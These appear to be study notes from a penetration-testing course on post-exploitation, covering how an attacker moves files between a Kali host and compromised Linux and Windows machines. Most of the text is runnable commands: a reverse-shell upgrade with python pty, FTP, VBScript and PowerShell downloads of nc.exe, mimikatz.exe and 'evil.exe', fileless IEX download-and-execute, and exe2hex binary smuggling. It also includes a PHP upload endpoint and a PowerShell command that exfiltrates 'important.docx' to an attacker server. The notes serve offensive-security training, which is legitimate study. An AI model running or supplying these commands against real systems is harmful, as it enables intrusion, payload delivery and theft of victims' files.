post-exploitation involves 
- elevating privilege 
- expanding control into additional machines
- installing backdoors
- cleaning up evidence of attack
- uploading files and tools to target

Attack tools are Detected by anti virus software
Attack tools could be used by others - remove them after use
Always try to use native tools first and if insufficient use additional tools
--------------------
Installing Pure-FTPd
--------------------
$ sudo apt update && sudo apt install pure-ftpd

// create user and group for the ftp site
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pw useradd prajesh -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
systemctl restart pure-ftpd
-------------------------
The Non-Interactive Shell
-------------------------
Netcat-like tools provide non-interactive shell i.e programs that require user input (su and sudo) work poorly
FTP - Interactive

debian (nc listener forwards reverse shell) <-> kali (connects to debian via nc)
debian (using the nc session connects to debian via ftp)
shell in non-interactive - standard output from ftp session is not redirected correctly

---------------------------------
Upgrading a Non-Interactive Shell
---------------------------------
python interpreter comes with module pty which stands for pseudo-terminals.
kali $ nc -vn <debian ip> 4444
python -c 'import pty; pty.spawn("/bin/bash")'

------------------------------------------------
Transferring Files with Windows Hosts is tricky
------------------------------------------------
No netcat, curl or wget preinstalled like in Unix

-----------------------------
Non-Interactive FTP Download
----------------------------
> ftp -h
-s: filename 

-s option accepts text-based command list and makes client non-interactive.

> echo open 10.0.0.1 21 > ftp.txt
> echo USER offsec >> ftp.txt
> echo password >> ftp.txt
> echo bin >> ftp.txt
> echo GET nc.exe >> ftp.txt
> echo bye >> ftp.txt

> ftp -v -n -s:ftp.txt
-v -> supress any returned output
-n -> supress automatic login
-s -> name of command file
--------------------------------------------
Windows Downloads Using Scripting Languages
--------------------------------------------
create wget.vbs script
Run it with cscript
> cscript wget.vbs http://ip/evil.exe evil.exe

// download using powershell System.Net.WebClient class
c: > powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.237.130:8000/mimikatz.exe', 'mimikatz.exe')

// wget.ps1
$webclient = New-Object System.Net.WebClient
$url = "http://ip/evil.exe"
$file = "exploit.exe"
$webclient.DownloadFile($url, $file)

> powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1

// Download and execute a powershell script without saving to disk
// use DownloadString method with Invoke-Expression cmdlet (IEX)
cat helloworld.ps1
Write-Output "Hello World"
> powershell.exe IEX (New-Object System.Net.Webclient).DownloadString('http://ip/helloworld.ps1')

---------------------------------------------
Windows Downloads with exe2hex and PowerShell
---------------------------------------------

compress binary > convert to hex > embed into windows script
Run the script > redirects hex data into powershell.exe which will assemble it back to binary

// compress using upx, (executable packer or PE compression tool)
$ upx -9 nc.exe

// convert nx.exe to nc.cmd
$ exe2hex -x nc.exe -p nc.cmd
// copy the nc.cmd script 
$ cat nc.cmd | xclip -selection clipboard

// and paste it on a windows bind shell 
// running it will convert the file to hex and instruct powershell to assemble it back to binary

--------------------------------------------------
Windows Uploads Using Windows Scripting Languages
--------------------------------------------------
upload file using System.Net.WebClient class

-create php script in /var/www/html and save it as upload.php in kali webroot

<?php
$uploaddir = '/var/www/uploads/';
$uploadfile = $uploaddir. $_FILES['file']['name'];
move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
?>

Files will be uploaded to /var/www/uploads directory

// create upload folder
$ sudo mkdir /var/www/uploads

// grant www-data user ownership and write permissions to the folder
$ ps -ef | grep apache
$ sudo chown www-data: /var/www/uploads

// on windows exfiltrate the document
> powershell (New-Object System.Net.WebClient).UploadFile('http://10.11.0.4/upload.php', 'important.docx')

-----------------------------
Uploading Files with TFTP
-----------------------------
TFTP is UDP-based file transfer protocol
Not available on newer windows system. Present in XP.

// Install TFTP server on kali
$ sudo apt update && sudo apt install atftp

// turn on tftp client on windows
Control Panel > Program and Features > Turn Windows Features On > TFTP client

// update ownership of directory so we can write files to it
$ sudo mkdir /tftp
$ sudo chown nobody: /tftp

// run atftpd daemon on UDP 69 and direct it to use the /tftp folder
$ sudo atftpd --daemon --port 69 /tftp

// windows
// upload
> tftp -i <kali ip> put important.docx
// download
> tftp -i <kali ip> get important.docx

Living Off The Land Binaries and Scripts (LOLBAS) project
certutil.exe can also be used to download files.
